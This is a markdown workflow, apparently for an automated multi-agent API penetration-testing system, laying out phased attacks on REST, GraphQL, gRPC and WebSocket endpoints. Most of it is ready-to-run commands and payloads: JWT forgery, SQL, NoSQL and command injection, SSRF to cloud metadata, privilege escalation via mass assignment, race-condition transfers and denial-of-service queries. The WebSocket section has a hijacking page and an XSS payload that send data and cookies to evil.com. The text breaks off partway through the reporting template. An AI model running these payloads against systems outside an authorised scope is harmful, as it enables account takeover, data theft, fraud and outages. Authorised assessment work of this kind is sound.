---
name: W_HUNT_API
description: Comprehensive API security assessment (REST, GraphQL, gRPC, WebSocket)
trigger: API endpoint, Swagger/OpenAPI spec, or GraphQL endpoint detected
agents: [APIAgent, GraphQLAgent, WebSocketAgent, AuthAgent, OAuthAgent, IDORAgent, SQLiAgent, NoSQLiAgent, RCEAgent, CommandInjectionAgent, DeserializationAgent, SSRFAgent, CRLFAgent, RaceConditionAgent, BusinessLogicAgent, ValidatorAgent, ExploitChainAgent]
tools: [dev-browser, burp-bridge, credential-vault]
skills_invoked: [APISecurityTesting]
---

# W_HUNT_API: API Security Assessment Workflow

## Overview

This workflow provides a comprehensive methodology for testing REST APIs, GraphQL endpoints, gRPC services, and WebSocket connections. It covers authentication, authorization, injection, business logic, and protocol-specific attack surfaces. Each phase produces structured findings that feed into the final reporting phase.

## Trigger Conditions

- Target URL matches API path patterns (`/api/`, `/v1/`, `/v2/`, `/graphql`, `/query`)
- Swagger/OpenAPI specification file detected (`swagger.json`, `openapi.yaml`, `/docs`, `/redoc`)
- GraphQL introspection endpoint responds
- gRPC reflection is enabled on target port
- Postman collection provided in scope definition
- WebSocket upgrade observed in traffic capture

## Pre-Workflow Setup

```bash
# Set target variables
export API_TARGET="https://target.com/api"
export API_BASE="https://target.com"
export WORDLIST_API="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
export WORDLIST_PARAMS="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"

# Prepare authentication tokens from credential-vault
# credential-vault get --scope $TARGET_SCOPE --role user1
# credential-vault get --scope $TARGET_SCOPE --role admin
```

---

## PHASE 1: API DISCOVERY

**Objective:** Map the complete API surface — endpoints, parameters, methods, data types, authentication schemes, and versioning.

### 1.1 Swagger/OpenAPI Specification Parsing

```bash
# Probe common OpenAPI/Swagger endpoints
httpx -l api_targets.txt -path "/swagger.json,/openapi.json,/api-docs,/swagger/v1/swagger.json,/v2/api-docs,/v3/api-docs,/.well-known/openapi.yaml,/docs,/redoc,/swagger-ui.html,/swagger-resources" -mc 200 -o swagger_endpoints.txt

# Download and parse specification
curl -s "$API_TARGET/swagger.json" | jq '.' > swagger_spec.json
curl -s "$API_TARGET/openapi.yaml" > openapi_spec.yaml

# Extract all endpoints from OpenAPI spec
cat swagger_spec.json | jq -r '.paths | keys[]' > api_endpoints.txt

# Extract all HTTP methods per endpoint
cat swagger_spec.json | jq -r '.paths | to_entries[] | .key as $path | .value | to_entries[] | "\(.key | ascii_upcase) \($path)"' > api_methods.txt

# Extract parameter names and types
cat swagger_spec.json | jq -r '.paths[][] | select(.parameters) | .parameters[] | "\(.name) (\(.in)) - \(.type // .schema.type)"' > api_parameters.txt

# Extract security definitions
cat swagger_spec.json | jq '.securityDefinitions // .components.securitySchemes' > auth_schemes.json

# Extract data models/schemas
cat swagger_spec.json | jq '.definitions // .components.schemas' > data_models.json
```

### 1.2 Endpoint Enumeration and Fuzzing

```bash
# Directory/endpoint brute force
ffuf -u "$API_TARGET/FUZZ" -w $WORDLIST_API -mc 200,201,204,301,302,307,401,403,405 -o api_fuzz_results.json -of json

# Version enumeration
for v in v1 v2 v3 v4 v5 api internal dev staging; do
  httpx -u "$API_BASE/$v" -mc 200,301,302,401,403 -title -tech-detect -o "version_${v}.txt"
done

# HTTP method enumeration per endpoint
while read endpoint; do
  for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
    curl -s -o /dev/null -w "%{http_code} $method $endpoint\n" -X $method "$API_BASE$endpoint"
  done
done < api_endpoints.txt > method_enum_results.txt

# Nuclei API-specific templates
nuclei -u "$API_TARGET" -t api/ -t exposures/ -t misconfiguration/ -o nuclei_api_results.txt

# Check for undocumented endpoints using common patterns
ffuf -u "$API_TARGET/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -mc 200,201,204,401,403,405 -recursion -recursion-depth 2 -o undocumented_endpoints.json -of json
```

### 1.3 GraphQL Introspection

```bash
# Test for GraphQL introspection
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,type{name,kind,ofType{name}}}}}}"}' | jq '.' > graphql_schema.json

# Alternative introspection query
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}'

# GraphQL security scanning
graphql-cop -t "$API_BASE/graphql" -o graphql_cop_results.json

# InQL Scanner for Burp
# Load InQL extension in Burp -> point at GraphQL endpoint for automated analysis
```

### 1.4 gRPC Reflection

```bash
# gRPC service enumeration via reflection
grpcurl -plaintext $GRPC_TARGET:$GRPC_PORT list
grpcurl -plaintext $GRPC_TARGET:$GRPC_PORT list $SERVICE_NAME

# Describe service methods
grpcurl -plaintext $GRPC_TARGET:$GRPC_PORT describe $SERVICE_NAME

# Describe message types
grpcurl -plaintext $GRPC_TARGET:$GRPC_PORT describe $MESSAGE_TYPE
```

### 1.5 Postman Collection Import

```bash
# Convert Postman collection to endpoint list
cat postman_collection.json | jq -r '.. | .url? // empty | if type == "object" then .raw else . end' > postman_endpoints.txt

# Import into Burp via Postman integration
# File -> Import -> Postman Collection
```

### 1.6 Traffic Analysis

```bash
# Passive API discovery via proxy logs (Burp)
# burp-bridge export-sitemap --scope $API_TARGET --format json > burp_sitemap.json

# Analyze Content-Type headers across endpoints
# Identify JSON, XML, multipart, protobuf, msgpack endpoints
```

**Phase 1 Output:** Complete API surface map with endpoints, methods, parameters, authentication requirements, and data models.

---

## PHASE 2: AUTHENTICATION TESTING

**Objective:** Test all authentication mechanisms for weaknesses — API keys, JWT, OAuth, session tokens, and API gateway controls.

### 2.1 API Key Exposure

```bash
# Check for API keys in common locations
nuclei -u "$API_BASE" -t exposures/tokens/ -o api_key_exposure.txt

# Test API key in various header locations
for header in "X-API-Key" "Authorization" "X-Auth-Token" "Api-Key" "apikey" "access_token" "token"; do
  curl -s -o /dev/null -w "%{http_code} $header\n" -H "$header: INVALID_KEY" "$API_TARGET/protected-endpoint"
done

# Check if API key is accepted in query parameters (insecure)
curl -s "$API_TARGET/protected-endpoint?api_key=VALID_KEY" -o /dev/null -w "%{http_code}"
curl -s "$API_TARGET/protected-endpoint?apikey=VALID_KEY" -o /dev/null -w "%{http_code}"

# Test for default/weak API keys
for key in "test" "admin" "default" "123456" "api_key" "secret" "password"; do
  curl -s -o /dev/null -w "%{http_code} key=$key\n" -H "X-API-Key: $key" "$API_TARGET/protected-endpoint"
done
```

### 2.2 JWT Attacks

```bash
# Decode JWT without verification
echo "$JWT_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq '.'
echo "$JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'

# Test algorithm confusion: none algorithm
python3 -c "
import jwt, base64, json
header = {'alg': 'none', 'typ': 'JWT'}
payload = json.loads(base64.urlsafe_b64decode('$JWT_PAYLOAD_B64' + '=='))
payload['role'] = 'admin'
token = jwt.encode(payload, '', algorithm='none')
print(token)
"

# Test algorithm confusion: HS256 with RSA public key
# If server uses RS256, try signing with HS256 using the public key as secret
python3 -c "
import jwt
with open('public_key.pem', 'r') as f:
    pub_key = f.read()
payload = {'sub': 'admin', 'role': 'admin'}
token = jwt.encode(payload, pub_key, algorithm='HS256')
print(token)
"

# JWT brute force secret
hashcat -a 0 -m 16500 "$JWT_TOKEN" /usr/share/wordlists/rockyou.txt
# OR
python3 jwt_tool.py "$JWT_TOKEN" -C -d /usr/share/wordlists/rockyou.txt

# JWT claim manipulation
python3 jwt_tool.py "$JWT_TOKEN" -T  # Tamper mode
python3 jwt_tool.py "$JWT_TOKEN" -I -pc role -pv admin  # Inject claim
python3 jwt_tool.py "$JWT_TOKEN" -X a  # All known attacks

# Test JWT expiration enforcement
# Use expired token and check if still accepted

# JWK injection / jku manipulation
python3 jwt_tool.py "$JWT_TOKEN" -X s  # Spoof JWKS
python3 jwt_tool.py "$JWT_TOKEN" -X k  # Key injection

# Kid parameter injection
python3 jwt_tool.py "$JWT_TOKEN" -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py "$JWT_TOKEN" -I -hc kid -hv "' UNION SELECT 'key' -- " -S hs256 -p "key"
```

### 2.3 OAuth Token Abuse

```bash
# Test OAuth redirect_uri manipulation
curl -s "$API_BASE/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com/callback&response_type=code&scope=read"

# Test scope escalation
curl -s "$API_BASE/oauth/authorize?client_id=CLIENT&redirect_uri=VALID_URI&response_type=code&scope=admin+read+write"

# Token exchange without proper validation
curl -s -X POST "$API_BASE/oauth/token" -d "grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://evil.com"

# Refresh token rotation check
curl -s -X POST "$API_BASE/oauth/token" -d "grant_type=refresh_token&refresh_token=OLD_TOKEN"

# PKCE bypass attempts
curl -s -X POST "$API_BASE/oauth/token" -d "grant_type=authorization_code&code=CODE&code_verifier="
```

### 2.4 API Gateway Bypass

```bash
# Direct backend access bypass
curl -s -H "X-Forwarded-For: 127.0.0.1" "$API_TARGET/admin"
curl -s -H "X-Original-URL: /admin" "$API_TARGET/"
curl -s -H "X-Rewrite-URL: /admin" "$API_TARGET/"

# Path traversal to bypass gateway routing
curl -s "$API_TARGET/public/../admin/users"
curl -s "$API_TARGET/public/..;/admin/users"
curl -s "$API_TARGET/public/%2e%2e/admin/users"

# HTTP/2 request smuggling via gateway
# Test downgrade attacks and header injection
```

### 2.5 Rate Limit Testing

```bash
# Basic rate limit test
for i in $(seq 1 200); do
  curl -s -o /dev/null -w "%{http_code}\n" "$API_TARGET/login" -X POST \
    -d '{"username":"test","password":"wrong'$i'"}' -H "Content-Type: application/json"
done | sort | uniq -c

# Rate limit bypass techniques
# IP rotation headers
curl -s -H "X-Forwarded-For: 1.2.3.$((RANDOM % 255))" "$API_TARGET/login"
curl -s -H "X-Real-IP: 1.2.3.$((RANDOM % 255))" "$API_TARGET/login"
curl -s -H "X-Originating-IP: 1.2.3.$((RANDOM % 255))" "$API_TARGET/login"

# Case variation bypass
curl -s "$API_TARGET/Login"
curl -s "$API_TARGET/LOGIN"
curl -s "$API_TARGET/login/"
curl -s "$API_TARGET/login?"

# Endpoint variation
curl -s "$API_TARGET/v1/login"
curl -s "$API_TARGET/v2/login"
```

**Phase 2 Output:** Authentication vulnerability findings with severity ratings and proof-of-concept tokens/requests.

---

## PHASE 3: AUTHORIZATION TESTING (BOLA / BFLA)

**Objective:** Test for Broken Object Level Authorization (BOLA/IDOR), Broken Function Level Authorization (BFLA), mass assignment, and excessive data exposure.

### 3.1 BOLA / IDOR Testing

```bash
# Identify resource IDs in API responses
# Look for patterns: /users/{id}, /orders/{id}, /files/{id}

# Sequential ID testing
for id in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} /users/$id\n" -H "Authorization: Bearer $USER_TOKEN" "$API_TARGET/users/$id"
done

# UUID prediction (check for sequential UUIDs or time-based patterns)
# Test accessing resources belonging to other users
curl -s -H "Authorization: Bearer $USER1_TOKEN" "$API_TARGET/users/$USER2_ID"
curl -s -H "Authorization: Bearer $USER1_TOKEN" "$API_TARGET/users/$USER2_ID/orders"
curl -s -H "Authorization: Bearer $USER1_TOKEN" "$API_TARGET/users/$USER2_ID/documents"

# IDOR in PUT/PATCH/DELETE operations
curl -s -X PUT -H "Authorization: Bearer $USER1_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}' \
  "$API_TARGET/users/$USER2_ID"

curl -s -X DELETE -H "Authorization: Bearer $USER1_TOKEN" \
  "$API_TARGET/users/$USER2_ID/orders/123"

# IDOR via parameter pollution
curl -s "$API_TARGET/orders?user_id=$USER2_ID" -H "Authorization: Bearer $USER1_TOKEN"
curl -s "$API_TARGET/orders" -H "Authorization: Bearer $USER1_TOKEN" -d "user_id=$USER2_ID"
```

### 3.2 BFLA Testing

```bash
# Test admin endpoints with regular user tokens
curl -s -H "Authorization: Bearer $USER_TOKEN" "$API_TARGET/admin/users"
curl -s -H "Authorization: Bearer $USER_TOKEN" "$API_TARGET/admin/settings"
curl -s -H "Authorization: Bearer $USER_TOKEN" "$API_TARGET/admin/logs"

# Test privileged operations
curl -s -X POST -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' "$API_TARGET/users/$USER_ID/role"

curl -s -X DELETE -H "Authorization: Bearer $USER_TOKEN" "$API_TARGET/users/$OTHER_USER_ID"

# HTTP method switching
# If GET is restricted, try POST and vice versa
curl -s -X POST -H "Authorization: Bearer $USER_TOKEN" "$API_TARGET/admin/users"
curl -s -X GET -H "Authorization: Bearer $USER_TOKEN" "$API_TARGET/admin/delete-user?id=123"
```

### 3.3 Mass Assignment

```bash
# Identify writable fields by comparing GET response with PUT/PATCH body
# Look for fields like: role, isAdmin, verified, balance, permissions, status

# Add unexpected fields to create/update requests
curl -s -X POST -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","role":"admin","isAdmin":true,"verified":true,"balance":99999}' \
  "$API_TARGET/users"

curl -s -X PATCH -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","permissions":["read","write","delete","admin"]}' \
  "$API_TARGET/users/$USER_ID"

# Test via different content types
curl -s -X PATCH -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<user><role>admin</role><isAdmin>true</isAdmin></user>' \
  "$API_TARGET/users/$USER_ID"
```

### 3.4 Excessive Data Exposure

```bash
# Compare API responses across different user roles
diff <(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" "$API_TARGET/users" | jq '.') \
     <(curl -s -H "Authorization: Bearer $USER_TOKEN" "$API_TARGET/users" | jq '.')

# Check for sensitive fields in responses
curl -s -H "Authorization: Bearer $USER_TOKEN" "$API_TARGET/users/$USER_ID" | \
  jq 'keys' | grep -iE "password|secret|key|token|ssn|credit|card|hash|salt|internal"

# Check list endpoints for excessive data
curl -s -H "Authorization: Bearer $USER_TOKEN" "$API_TARGET/users" | jq '.[0] | keys'
```

**Phase 3 Output:** BOLA/BFLA/IDOR findings with request/response pairs and impact assessment.

---

## PHASE 4: INJECTION TESTING

**Objective:** Test for SQL injection, NoSQL injection, GraphQL injection, command injection, and other injection vectors via API parameters.

### 4.1 SQL Injection via API Parameters

```bash
# SQLMap on API endpoints
sqlmap -u "$API_TARGET/users?id=1" --headers="Authorization: Bearer $TOKEN" --batch --risk=3 --level=5

# SQLMap on POST JSON body
sqlmap -u "$API_TARGET/users/search" --data='{"name":"test","id":1}' \
  --headers="Authorization: Bearer $TOKEN\nContent-Type: application/json" \
  --batch --risk=3 --level=5

# SQLMap on specific parameter
sqlmap -u "$API_TARGET/users" --data='{"filter":"test"}' -p filter \
  --headers="Authorization: Bearer $TOKEN\nContent-Type: application/json" \
  --batch --tamper=space2comment,between

# Manual SQL injection payloads in JSON
for payload in "' OR '1'='1" "1 UNION SELECT null,null,null--" "1; DROP TABLE users--" "' AND SLEEP(5)--"; do
  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"search\":\"$payload\"}" \
    "$API_TARGET/users/search" -o /dev/null -w "%{http_code} %{time_total}\n"
done

# Test sort/order parameters for injection
curl -s "$API_TARGET/users?sort=name;SELECT+SLEEP(5)" -H "Authorization: Bearer $TOKEN"
curl -s "$API_TARGET/users?order=ASC,(SELECT+1+FROM+(SELECT+SLEEP(5))a)" -H "Authorization: Bearer $TOKEN"
```

### 4.2 NoSQL Injection

```bash
# MongoDB operator injection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' "$API_TARGET/login"

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}' "$API_TARGET/login"

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}' "$API_TARGET/login"

# MongoDB $where injection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"$where":"this.username == \"admin\" && this.password.match(/^.*/)"}' "$API_TARGET/users/search"

# Regex DoS via NoSQL
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^(a+)+$"}}' "$API_TARGET/users/search"
```

### 4.3 GraphQL Injection

```bash
# SQL injection via GraphQL variables
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query($id: String!){user(id: $id){name email}}","variables":{"id":"1 OR 1=1"}}'

# NoSQL injection via GraphQL
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{users(filter: {username: {ne: \"\"}}){name email password}}"}'

# SSRF via GraphQL
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation{importData(url: \"http://169.254.169.254/latest/meta-data/\"){result}}"}'
```

### 4.4 gRPC Message Manipulation

```bash
# Inject SQL payloads into gRPC string fields
grpcurl -plaintext -d '{"id": "1 OR 1=1", "name": "test"}' \
  $GRPC_TARGET:$GRPC_PORT $SERVICE_NAME/GetUser

# Test for command injection in gRPC fields
grpcurl -plaintext -d '{"filename": "test; cat /etc/passwd"}' \
  $GRPC_TARGET:$GRPC_PORT $SERVICE_NAME/ProcessFile

# Integer overflow in gRPC fields
grpcurl -plaintext -d '{"id": 2147483647}' \
  $GRPC_TARGET:$GRPC_PORT $SERVICE_NAME/GetUser
```

### 4.5 Command Injection via APIs

```bash
# Test parameters that may invoke system commands
for payload in "; cat /etc/passwd" "| id" "\$(id)" "\`id\`" "&& whoami" "|| whoami"; do
  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"filename\":\"test${payload}\"}" \
    "$API_TARGET/files/process"
done

# Test SSRF via URL parameters
for url in "http://169.254.169.254/latest/meta-data/" "http://127.0.0.1:8080/admin" "file:///etc/passwd" "http://[::1]:80/"; do
  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"$url\"}" \
    "$API_TARGET/fetch"
done
```

**Phase 4 Output:** Injection vulnerability findings with payloads, evidence, and exploitability assessment.

---

## PHASE 5: BUSINESS LOGIC TESTING

**Objective:** Test for rate limit bypass, resource exhaustion, batch processing abuse, and race conditions on API endpoints.

### 5.1 Rate Limit Bypass

```bash
# Distributed rate limit test
# Test if rate limits are per-IP, per-user, per-endpoint, or per-API-key
for i in $(seq 1 500); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "Authorization: Bearer $TOKEN" \
    -H "X-Forwarded-For: $((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))" \
    "$API_TARGET/expensive-operation"
done | sort | uniq -c

# Null byte / encoding bypass
curl -s "$API_TARGET/login%00" -X POST -d '{"user":"admin","pass":"test"}'
curl -s "$API_TARGET/login%20" -X POST -d '{"user":"admin","pass":"test"}'
```

### 5.2 Resource Exhaustion

```bash
# Large payload testing
python3 -c "import json; print(json.dumps({'data': 'A' * 10000000}))" | \
  curl -s -X POST -H "Content-Type: application/json" -d @- "$API_TARGET/process"

# Deep JSON nesting
python3 -c "
d = {'key': 'value'}
for i in range(1000):
    d = {'nested': d}
import json; print(json.dumps(d))
" | curl -s -X POST -H "Content-Type: application/json" -d @- "$API_TARGET/parse"

# Array bomb
python3 -c "import json; print(json.dumps({'items': list(range(1000000))}))" | \
  curl -s -X POST -H "Content-Type: application/json" -d @- "$API_TARGET/batch"

# Pagination abuse
curl -s "$API_TARGET/users?page=1&per_page=999999" -H "Authorization: Bearer $TOKEN"
curl -s "$API_TARGET/users?limit=-1" -H "Authorization: Bearer $TOKEN"
curl -s "$API_TARGET/users?offset=0&limit=2147483647" -H "Authorization: Bearer $TOKEN"
```

### 5.3 Batch Processing Abuse

```bash
# Batch endpoint abuse
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"operations":[{"method":"GET","path":"/users/1"},{"method":"GET","path":"/users/2"},{"method":"DELETE","path":"/users/3"}]}' \
  "$API_TARGET/batch"

# GraphQL batch query abuse
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id: 1) { email } }"},{"query":"{ user(id: 2) { email } }"},{"query":"{ user(id: 3) { email } }"}]'
```

### 5.4 Race Conditions

```bash
# Race condition on balance/transfer operations
# Using turbo intruder or parallel curl requests
for i in $(seq 1 50); do
  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"to":"attacker_account","amount":100}' \
    "$API_TARGET/transfer" &
done
wait

# Race condition on coupon/discount application
for i in $(seq 1 20); do
  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"coupon":"DISCOUNT50"}' \
    "$API_TARGET/orders/123/apply-coupon" &
done
wait

# Race condition on account creation (duplicate check bypass)
for i in $(seq 1 10); do
  curl -s -X POST -H "Content-Type: application/json" \
    -d '{"email":"unique@test.com","password":"password123"}' \
    "$API_TARGET/register" &
done
wait

# Single-packet race condition (HTTP/2)
# Use Burp Repeater group send in parallel (single-packet attack)
```

**Phase 5 Output:** Business logic flaws with reproduction steps, timing data, and financial/operational impact.

---

## PHASE 6: DATA EXPOSURE TESTING

**Objective:** Identify information leakage through verbose errors, debug endpoints, health checks, version disclosure, and stack traces.

### 6.1 Verbose Error Messages

```bash
# Trigger errors with invalid input
curl -s "$API_TARGET/users/AAAAAAA" -H "Authorization: Bearer $TOKEN" | jq '.'
curl -s "$API_TARGET/users/-1" -H "Authorization: Bearer $TOKEN" | jq '.'
curl -s "$API_TARGET/users/null" -H "Authorization: Bearer $TOKEN" | jq '.'

# Invalid content types
curl -s -X POST -H "Content-Type: application/xml" -d "<invalid>" "$API_TARGET/users"
curl -s -X POST -H "Content-Type: text/plain" -d "invalid" "$API_TARGET/users"

# Malformed JSON
curl -s -X POST -H "Content-Type: application/json" -d '{invalid}' "$API_TARGET/users"
curl -s -X POST -H "Content-Type: application/json" -d '' "$API_TARGET/users"
```

### 6.2 Debug and Management Endpoints

```bash
# Spring Boot Actuator endpoints
for endpoint in actuator actuator/health actuator/info actuator/env actuator/beans \
  actuator/configprops actuator/mappings actuator/metrics actuator/trace actuator/dump \
  actuator/heapdump actuator/threaddump actuator/loggers actuator/auditevents; do
  httpx -u "$API_BASE/$endpoint" -mc 200 -title -o actuator_results.txt
done

# Common debug/management endpoints
for endpoint in debug status health healthcheck _debug _status _health \
  metrics info config env internal _internal server-status server-info \
  phpinfo.php elmah.axd trace; do
  httpx -u "$API_BASE/$endpoint" -mc 200,401,403 -o debug_endpoints.txt
done

# Check for exposed documentation
for endpoint in docs swagger swagger-ui redoc api-docs graphiql graphql/playground; do
  httpx -u "$API_BASE/$endpoint" -mc 200 -o docs_endpoints.txt
done
```

### 6.3 Version and Technology Disclosure

```bash
# Analyze response headers for version info
curl -s -I "$API_TARGET/" | grep -iE "server|x-powered|x-version|x-aspnet|x-runtime"

# Check for version in API responses
curl -s "$API_TARGET/" -H "Authorization: Bearer $TOKEN" | grep -iE "version|build|commit|release"

# Technology fingerprinting
httpx -u "$API_BASE" -tech-detect -title -status-code -o tech_fingerprint.txt
```

**Phase 6 Output:** Data exposure findings categorized by type and sensitivity level.

---

## PHASE 7: GRAPHQL-SPECIFIC TESTING

> **Condition:** Only execute if GraphQL endpoint is detected in Phase 1.

### 7.1 Introspection Abuse

```bash
# Full introspection if enabled
graphql-cop -t "$API_BASE/graphql" -o graphql_security_results.json

# Check if introspection is disabled in production
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | jq '.errors'

# Bypass introspection disable
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{__type(name:\"User\"){name fields{name type{name}}}}"}'

# Field suggestion exploitation (if introspection is disabled)
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{user{passwor}}"}'  # Check for "Did you mean password?" suggestions
```

### 7.2 Batch Query Attacks

```bash
# Query batching for brute force bypass
python3 -c "
import json
queries = []
for i in range(100):
    queries.append({'query': 'mutation { login(username: \"admin\", password: \"pass' + str(i) + '\") { token } }'})
print(json.dumps(queries))
" | curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" -d @-

# Alias-based batching (single request, many operations)
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ a1: user(id: 1) { email } a2: user(id: 2) { email } a3: user(id: 3) { email } a4: user(id: 4) { email } a5: user(id: 5) { email } }"}'
```

### 7.3 Nested Query DoS (Query Depth Attack)

```bash
# Deep nested query for denial of service
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { posts { author { posts { author { posts { author { posts { author { name } } } } } } } } } }"}'

# Query complexity attack
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users(first: 1000) { posts(first: 1000) { comments(first: 1000) { author { name } } } } }"}'

# Check for query depth/complexity limits
# Gradually increase depth and observe when/if limits are enforced
```

### 7.4 Field-Level Authorization

```bash
# Test access to fields that should be restricted
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"{ user(id: 1) { name email password passwordHash ssn creditCard internalId role permissions } }"}'

# Mutation authorization bypass
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"mutation { updateUser(id: 1, input: { role: \"admin\" }) { id role } }"}'

# Access admin-only queries with user token
curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"{ adminDashboard { totalRevenue users { email password } } }"}'
```

### 7.5 Alias Abuse

```bash
# Use aliases to bypass rate limiting on specific operations
python3 -c "
aliases = []
for i in range(500):
    aliases.append(f'a{i}: login(username: \"admin\", password: \"pass{i}\") {{ token }}')
query = 'mutation { ' + ' '.join(aliases) + ' }'
import json
print(json.dumps({'query': query}))
" | curl -s -X POST "$API_BASE/graphql" -H "Content-Type: application/json" -d @-
```

**Phase 7 Output:** GraphQL-specific vulnerability findings with queries, responses, and impact analysis.

---

## PHASE 8: WEBSOCKET-SPECIFIC TESTING

> **Condition:** Only execute if WebSocket endpoints are detected.

### 8.1 Cross-Site WebSocket Hijacking (CSWSH)

```bash
# Test origin validation
wsrepl -u "ws://$TARGET/ws" -o "https://evil.com"
wsrepl -u "ws://$TARGET/ws" -o "null"
wsrepl -u "ws://$TARGET/ws" -o "https://$TARGET.evil.com"

# Craft CSWSH HTML payload
cat << 'CSWSH_EOF'
<html>
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() {
    ws.send('{"action":"getProfile"}');
};
ws.onmessage = function(event) {
    fetch("https://evil.com/log?data=" + btoa(event.data));
};
</script>
</html>
CSWSH_EOF
```

### 8.2 WebSocket Message Injection

```bash
# Test for injection in WebSocket messages
wsrepl -u "ws://$TARGET/ws" -m '{"action":"query","data":"test\" OR 1=1--"}'
wsrepl -u "ws://$TARGET/ws" -m '{"action":"exec","cmd":"id"}'
wsrepl -u "ws://$TARGET/ws" -m '{"action":"subscribe","channel":"admin-notifications"}'

# Test for XSS via WebSocket messages
wsrepl -u "ws://$TARGET/ws" -m '{"message":"<img src=x onerror=alert(1)>"}'
wsrepl -u "ws://$TARGET/ws" -m '{"message":"<script>document.location=\"https://evil.com?c=\"+document.cookie</script>"}'
```

### 8.3 WebSocket Authentication Bypass

```bash
# Test if WebSocket connection requires authentication
wsrepl -u "ws://$TARGET/ws"  # Connect without auth

# Test if authentication is only checked at connection time
# Connect with valid token, then try privileged operations after token expires

# Test token replay
wsrepl -u "ws://$TARGET/ws?token=$OLD_TOKEN"

# Attempt to subscribe to other users' channels
wsrepl -u "ws://$TARGET/ws" -m '{"subscribe":"user-2-channel"}'
wsrepl -u "ws://$TARGET/ws" -m '{"subscribe":"admin-channel"}'
```

### 8.4 WebSocket Origin Validation

```bash
# Test with various origin headers
for origin in "https://evil.com" "null" "https://target.com.evil.com" \
  "https://subdomain.target.com" "http://target.com" ""; do
  echo "Testing origin: $origin"
  wsrepl -u "ws://$TARGET/ws" -o "$origin" -m '{"ping":"test"}'
done
```

**Phase 8 Output:** WebSocket vulnerability findings with connection logs, message traces, and exploitation proof.

---

## PHASE 9: REPORTING

**Objective:** Aggregate all findings, deduplicate, score by severity, and produce a structured vulnerability report.

### 9.1 Finding Aggregation

```yaml
report_structure:
  executive_summary:
    - total_vulnerabilities_found
    - critical_count
    - high_count
    - medium_count
    - low_count
    - informational_count
    - overall_risk_rating
  
  api_surface_summary:
    - total_endpoints_discovered
    - authenticated_endpoints
    - unauthenticated_endpoints
    - deprecated_endpoints
    - undocumented_endpoints
    - protocols_tested: [REST, GraphQL, gRPC, WebSocket]
  
  findings_by_category:
    authentication:
      - jwt_vulnerabilities
